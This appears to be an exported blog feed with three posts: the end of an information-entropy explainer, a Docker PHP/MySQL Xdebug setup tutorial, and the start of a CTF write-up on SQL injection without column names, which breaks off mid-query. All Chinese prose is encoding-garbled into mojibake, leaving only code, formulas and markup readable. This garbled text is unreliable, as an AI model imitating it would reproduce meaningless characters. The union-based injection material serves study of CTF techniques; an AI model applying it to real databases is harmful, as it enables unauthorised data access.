$2^3=8ç§$</p><p><code>[æ­£æ­£æ­£,æ­£æ­£å,æ­£åæ­£,æ­£åå,åæ­£æ­£,åæ­£å,ååæ­£,ååå]</code></p><p>ä¸æ˜¯çº¿æ€§å…³ç³»ï¼Œè€Œæ˜¯æŒ‡æ•°å…³ç³»ï¼Œæ‰€ä»¥å½“çŸ¥é“å¯èƒ½æƒ…å†µä¸ªæ•°mï¼Œæƒ³æ±‚è¿™äº›æƒ…å†µç›¸å½“äºå¤šå°‘ä¸ªnå‚ç…§äº‹ä»¶äº§ç”Ÿçš„æ—¶ï¼Œå°±ç”¨å¯¹æ•°è¿ç®—å³å¯ã€‚</p><p>$$ m = 2^n $$</p><p>$$ n = log_2m $$</p><p>æ‰€ä»¥å¯¹ç­”æ¡ˆABCDé‡Œå“ªä¸€é€‰é¡¹çš„ä¸ç¡®å®šæ€§å³ä¸º<br>$$ log_24 = 2 bits $$<br>è¿™ç§æƒ…å†µå› ä¸ºæ¯ä¸ªé€‰é¡¹éƒ½æ˜¯25%çš„ç­‰æ¦‚ç‡æ‰å¯ä»¥ï¼Œä¸æŠ›ç¡¬å¸ä¸€æ ·ï¼Œå‡ºç°æ­£åçš„æ¦‚ç‡éƒ½æ˜¯ç›¸ç­‰çš„50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>å¯å¼ ä¸‰çŸ¥é“æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹æ—¶ï¼Œå„ä¸ªæƒ…å†µçš„æ¦‚ç‡å°±ä¸ä¸€æ ·äº†ã€‚è¿™æ—¶è¦åˆ†åˆ«æµ‹é‡å¾…æµ‹äº‹ä»¶æ¯ç§å¯èƒ½çš„ä¿¡æ¯é‡åä¹˜å®ƒä»¬å„è‡ªå‘ç”Ÿçš„æ¦‚ç‡å†ç›¸åŠ å³å¯ã€‚</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>ä¸è¿‡æˆ‘ä»¬ä¸çŸ¥é“æ¦‚ç‡ä¸º1/6çš„æƒ…å†µçš„ä¸ç¡®å®šæ€§ç›¸å½“äºæŠ›å¤šå°‘ä¸ªç¡¬å¸æ‰€äº§ç”Ÿçš„ä¸ç¡®å®šæ€§ï¼ŒmæœªçŸ¥å°±æ²¡æ³•ç”¨è¿™ä¸ªå…¬å¼</p><p>$$ log_2m_A $$</p><p>ä½†1%ä¼šå‘ç”Ÿçš„æƒ…å†µç›¸å½“äºä»100ä¸ªç­‰æ¦‚ç‡æƒ…å†µä¸­ç¡®å®šå®é™…æƒ…å†µï¼Œè€Œæ¦‚ç‡çš„å€’æ•°=ç­‰æ¦‚ç‡æƒ…å†µçš„ä¸ªæ•°</p><p>$$ p = 1/100 $$<br>$$ 100 = 1/p $$</p><p>ç”¨æ¦‚ç‡çš„å€’æ•°1/pæ›¿æ¢ç­‰æ¦‚ç‡æƒ…å†µä¸ªæ•°måå°±å¯ä»¥è®¡ç®—æ¯ç§æƒ…å†µçš„ä¿¡æ¯é‡äº†</p><p>$$ m = 1/p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>å†å°†æ¯ä¸ªæƒ…å†µçš„ä¿¡æ¯é‡ä¹˜å¯¹åº”å‘ç”Ÿçš„æ¦‚ç‡å†ç›¸åŠ ï¼Œå°±èƒ½ç®—å‡ºæ€»ä¿¡æ¯é‡äº†</p><p>$$ P_A: 1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_b:1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_c:1/2 log_2(2/1) = 0.5 bits $$</p><p>$$ P_d:1/6 log_2(6/1) = 0.43 bits $$</p><p>å¼ ä¸‰å¾—çŸ¥<code>&quot;æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹&quot;</code>åçš„ä¸ç¡®å®šæ€§(ç†µ)ä¸º $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d = 1.79 bits $$</p><p>å‘Šè¯‰å¼ ä¸‰<code>&quot;æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹&quot;</code>åæä¾›çš„ä¿¡æ¯ä¸º $2-1.79=0.21 bits$</p><h3 id="å‡åŒ€åˆ†å¸ƒ"><a href="#å‡åŒ€åˆ†å¸ƒ" class="headerlink" title="å‡åŒ€åˆ†å¸ƒ"></a>å‡åŒ€åˆ†å¸ƒ</h3><p>$$ log_2m $$</p><h3 id="ä¸€èˆ¬åˆ†å¸ƒ"><a href="#ä¸€èˆ¬åˆ†å¸ƒ" class="headerlink" title="ä¸€èˆ¬åˆ†å¸ƒ"></a>ä¸€èˆ¬åˆ†å¸ƒ</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.zhihu.com/question/22178202">çŸ¥ä¹:ä¿¡æ¯ç†µæ˜¯ä»€ä¹ˆï¼Ÿ</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">å¾®ä¿¡å…¬ä¼—å·:è¶…æ™ºèƒ½ä½“ ä¿¡æ¯è®º</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">é©¬çŒ›é£,çŸ³ä¹ä¹‰,é­ä¸œå¹³,å¾å…´å.åŸºäºä¿¡æ¯ç†µçš„åˆ†å¸ƒå¼WebæœåŠ¡ç§»åŠ¨ç›®æ ‡é˜²å¾¡æ–¹æ¡ˆ[J].è®¡ç®—æœºæŠ€æœ¯ä¸å‘å±•,2020,30(10):131-136.</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ‘¸é±¼çš„å­¦ä¹ æ€»ç»“ï¼Œæä½œå“èµ›å¿…é¡»çš„ç†è®ºå­¦ä¹ â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="æ‚è°ˆç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>docker-php+mysqlé…ç½®debugç¯å¢ƒ</title>
    <link href="https://err0r.top/article/phpstormdebug/"/>
    <id>https://err0r.top/article/phpstormdebug/</id>
    <published>2021-03-31T03:49:39.000Z</published>
    <updated>2021-03-31T12:59:58.885Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸‹ä¹‹å‰æ­å»ºè¿‡ç¨‹</p><a id="more"></a><h2 id="å‰ç½®è¦æ±‚ï¼š"><a href="#å‰ç½®è¦æ±‚ï¼š" class="headerlink" title="å‰ç½®è¦æ±‚ï¼š"></a>å‰ç½®è¦æ±‚ï¼š</h2><ol><li>è£…å¥½phpstorm</li><li>è£…å¥½docker</li><li>ä¸‹è½½docker-compose(å¯é€‰)</li></ol><p>æœ€åé™„ä¸€é”®docker-composeæ­å»ºæ–¹æ³•ï¼Œå¯é™„å¸¦mysqlï¼Œæ„Ÿè°¢ç‹ç¥æŒ‡å¯¼ã€‚</p><h2 id="æ‰‹åŠ¨æ­å»º"><a href="#æ‰‹åŠ¨æ­å»º" class="headerlink" title="æ‰‹åŠ¨æ­å»º"></a>æ‰‹åŠ¨æ­å»º</h2><h3 id="dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²"><a href="#dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²" class="headerlink" title="dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²"></a>dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>éšæ„ï¼Œè¦å•¥ç‰ˆæœ¬èµ·å•¥å®¹å™¨ï¼Œå¯ä»¥å»<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> çœ‹</p><p>å‚æ•°è§£é‡Šï¼š</p><pre class="language-none"><code class="language-none">-d ï¼š åå°è¿è¡Œ-v ï¼š ç›®å½•æ˜ å°„ï¼Œå› ä¸ºæˆ‘ä»¬è¦æŠŠæœ¬åœ°ç›®å½•æ˜ å°„åˆ°å®¹å™¨ç›®å½•æœ¬åœ°ç›®å½•:å®¹å™¨ç›®å½•</code></pre><h3 id="å®‰è£…xdebugæ¨¡å—"><a href="#å®‰è£…xdebugæ¨¡å—" class="headerlink" title="å®‰è£…xdebugæ¨¡å—"></a>å®‰è£…xdebugæ¨¡å—</h3><p>å®‰è£…vimå¹¶æ¢æº</p><pre class="language-sh" data-language="sh"><code class="language-sh">echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \&amp;&amp; apt update &amp;&amp; apt install -y vim</code></pre><p>å®‰è£…xdebugæ¨¡å—</p><p><code>docker exec -it &lt;id&gt; bash</code>è¿›å…¥å®¹å™¨å</p><pre class="language-sh" data-language="sh"><code class="language-sh">docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug \    &amp;&amp; docker-php-ext-enable xdebug</code></pre><p><strong>æ³¨æ„</strong>ï¼šphp5.6éœ€è¦æŒ‡å®šç‰ˆæœ¬å®‰è£…xdebug</p><pre class="language-sh" data-language="sh"><code class="language-sh">RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0</code></pre><p>è¿è¡Œ<code>php -m</code> å‘ç°å·²ç»å®‰è£…å¥½xdebugæ¨¡å—</p><h3 id="ä¿®æ”¹php-ini"><a href="#ä¿®æ”¹php-ini" class="headerlink" title="ä¿®æ”¹php.ini"></a>ä¿®æ”¹php.ini</h3><pre class="language-sh" data-language="sh"><code class="language-sh">cp &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini-production &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inivim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</code></pre><p>æ·»åŠ </p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>å†™è¿›å»ä¹‹åé‡å¯apacheæœåŠ¡ <code>apache2ctl restart</code></p><p>æŸ¥çœ‹phpinfoï¼Œè®¿é—®<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="ä¸€é”®éƒ¨ç½²"><a href="#ä¸€é”®éƒ¨ç½²" class="headerlink" title="ä¸€é”®éƒ¨ç½²"></a>ä¸€é”®éƒ¨ç½²</h2><p>phpå¤šç‰ˆæœ¬+mysqlæœåŠ¡</p><p>ç›®å½•ç»“æ„</p><pre class="language-none"><code class="language-none">|docker-compose.ymlâ””--5.6 â””-Dockerfileâ””--7.4 â””-Dockerfile</code></pre><p>Docker-compose.ymlï¼Œå¦‚æœéœ€è¦èµ·ä¸åŒæˆ–æ›´å¤šçš„ç‰ˆæœ¬ï¼Œç…§ç€ä¿®æ”¹ymlå’ŒDockerfileå³å¯</p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># å®¹å™¨åç§°, è‡ªè¡Œä¿®æ”¹</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># æ„å»ºè·¯å¾„, . è¡¨ç¤ºä¼šåœ¨å½“å‰è·¯å¾„ä¸‹æ‰¾ Dockerfile æ–‡ä»¶</span>        <span class="token comment"># image: php:5.6-apache   # é•œåƒåç§°, å¦‚æœæ²¡æœ‰ä¸Šé¢çš„ build, docker-compose å°†ä¼šå°è¯•ä»å®˜æ–¹ä»“åº“ pull è¯¥é•œåƒ</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># æ˜ å°„ç«¯å£ è™šæ‹Ÿæœºç«¯å£:å®¹å™¨å†…ç«¯å£</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#è¿æ¥mysqlæœåŠ¡</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># è‡ªåŠ¨é‡å¯ï¼Œä¸€èˆ¬ç”¨äºå¼€æœºè‡ªå¯</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># è‡ªè®¾mysqlçš„password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># ç”±äºæ˜ å°„ç«¯å£ï¼Œå¯†ç éœ€è®¾å¼ºå¯†ç ï¼Œå¦åˆ™è¯·å…³é—­ç«¯å£æ˜ å°„</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># å®¹å™¨åç§°, è‡ªè¡Œä¿®æ”¹</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># æ„å»ºè·¯å¾„, . è¡¨ç¤ºä¼šåœ¨å½“å‰è·¯å¾„ä¸‹æ‰¾ Dockerfile æ–‡ä»¶</span>        <span class="token comment"># image: php:7.4-apache   # é•œåƒåç§°, å¦‚æœæ²¡æœ‰ä¸Šé¢çš„ build, docker-compose å°†ä¼šå°è¯•ä»å®˜æ–¹ä»“åº“ pull è¯¥é•œåƒ</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># æ˜ å°„ç«¯å£ è™šæ‹Ÿæœºç«¯å£:å®¹å™¨å†…ç«¯å£</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#è¿æ¥mysqlæœåŠ¡</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6çš„Dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:5.6-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0 \ # æŒ‡å®šxdebugç‰ˆæœ¬    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>7.4çš„dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:7.4-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN  docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug-2.9.0 \ # æœ€å¥½ä¹ŸæŒ‡å®šä¸‹ç‰ˆæœ¬    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>åœ¨docker-compose.ymlæ‰€åœ¨ç›®å½•è¿è¡Œ<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨æ˜ å°„ç›®å½•å†™ä¸ªphpinfoï¼Œç”¨ä¸åŒç«¯å£è®¿é—®æœ¬åœ°å¯è§ç‰ˆæœ¬ä¸åŒï¼Œå¯ä»¥éå¸¸çµæ´»åœ°è°ƒè¯•</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebugæ¨¡å—ä¹ŸåŠ è½½å¥½äº†</p><hr><h2 id="é…ç½®phpstorm"><a href="#é…ç½®phpstorm" class="headerlink" title="é…ç½®phpstorm"></a>é…ç½®phpstorm</h2><p>åœ¨æœ¬åœ°æ˜ å°„ç›®å½•ä¸‹æ–°å»ºé¡¹ç›®å¹¶æ‰“å¼€ï¼Œç‚¹å‡»å³ä¸Šè§’é…ç½®</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>æ‰“å¼€<code>è®¾ç½®Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>æ‰“å¼€<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chromeæµè§ˆå™¨å®‰è£…debugæ’ä»¶</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>ç„¶åå°±å¯ä»¥æƒ¹</p><hr><h2 id="è®¿é—®æµ‹è¯•"><a href="#è®¿é—®æµ‹è¯•" class="headerlink" title="è®¿é—®æµ‹è¯•"></a>è®¿é—®æµ‹è¯•</h2><p>ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œå°½é‡åˆ«æ”¾æœ‰å…¬ç½‘vpsçš„æœåŠ¡å™¨ä¸Šâ€¦ä¼šè¢«æ‰“</p><h3 id="é¡µé¢æµ‹è¯•"><a href="#é¡µé¢æµ‹è¯•" class="headerlink" title="é¡µé¢æµ‹è¯•"></a>é¡µé¢æµ‹è¯•</h3><p>æ˜ å°„ç›®å½•å†™phpinfo()ï¼Œè®¿é—®å¯¹åº”ç«¯å£çš„å®¹å™¨</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysqlæµ‹è¯•-ä¸€é”®éƒ¨ç½²å¯ç”¨"><a href="#mysqlæµ‹è¯•-ä¸€é”®éƒ¨ç½²å¯ç”¨" class="headerlink" title="mysqlæµ‹è¯•(ä¸€é”®éƒ¨ç½²å¯ç”¨)"></a>mysqlæµ‹è¯•(ä¸€é”®éƒ¨ç½²å¯ç”¨)</h3><p>æ˜ å°„ç›®å½•å†™<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// è‡ªè®¾çš„mysqlå¯†ç </span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:"</span> <span class="token punctuation">.</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è®¿é—®<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>æµ‹è¯•å®Œæ¯•</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸‹ä¹‹å‰æ­å»ºè¿‡ç¨‹&lt;/p&gt;</summary>
    
    
    
    <category term="æ‚è°ˆç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="èœé¸¡æ•™ç¨‹" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>SQLæ— åˆ—åæ³¨å…¥</title>
    <link href="https://err0r.top/article/mardasctf/"/>
    <id>https://err0r.top/article/mardasctf/</id>
    <published>2021-03-29T11:17:53.000Z</published>
    <updated>2021-04-20T08:17:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>sqlæ³¨å…¥çš„å§¿åŠ¿</p><a id="more"></a><p>ä»¥DASCTFä¸‰æœˆèµ›ä¸ºä¾‹ï¼Œè®°å½•ä¸‹æ— åˆ—åæ³¨å…¥ã€‚</p><h2 id="æ— åˆ—åæŸ¥è¯¢"><a href="#æ— åˆ—åæŸ¥è¯¢" class="headerlink" title="æ— åˆ—åæŸ¥è¯¢"></a>æ— åˆ—åæŸ¥è¯¢</h2><p>ä¾‹å¦‚joinè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼Œç°åœ¨æœ‰å¼ è¡¨<code>table</code>å¦‚ä¸‹</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>æ­£å¸¸<strong>åœ¨æ•°æ®åº“æŸ¥è¯¢</strong>ï¼Œè¡¨åéœ€å¸¦åå¼•å·ï¼Œåœ¨phpç«¯ä¸­<strong>å¹¶ä¸éœ€è¦</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>å‡è®¾ä¸çŸ¥é“åˆ—åï¼Œé€šè¿‡unionæŸ¥è¯¢ï¼Œéœ€çŒœæµ‹åˆ—æ•°ï¼Œè¿™é‡Œä¸º5åˆ—</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> 